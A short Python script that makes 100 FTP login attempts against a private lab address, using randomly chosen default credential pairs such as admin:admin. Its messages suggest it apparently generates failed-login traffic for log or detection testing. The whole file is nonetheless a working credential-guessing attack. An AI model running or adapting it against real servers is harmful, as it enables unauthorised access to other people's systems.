from ftplib import FTP
from datetime import datetime
import random

TARGET = "192.168.100.2"
PORT = 21

creds = [
    ("admin","admin"),
    ("root", "pass"),
    ("user", "guest123"),
    ("guest", "password123"),
    ("pi", "raspi"),
    ("test","test123")
]

def ftpRequest(username, password,attemptNum):
    try:
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] Attempt #{attemptNum}: {username}:{password}")
        ftp = FTP()
        ftp.connect(TARGET,PORT,timeout=2)
        ftp.login(username,password)
        print("this won't happen")
        ftp.quit()
        return True
    except Exception as e:
        print("failed; check log")
        return False
    
def main():
    attempts = 100
    for i in range(attempts):
        username,password = creds[random.randint(0,5)]
        ftpRequest(username,password,i+1)

if __name__ == "__main__":
    main()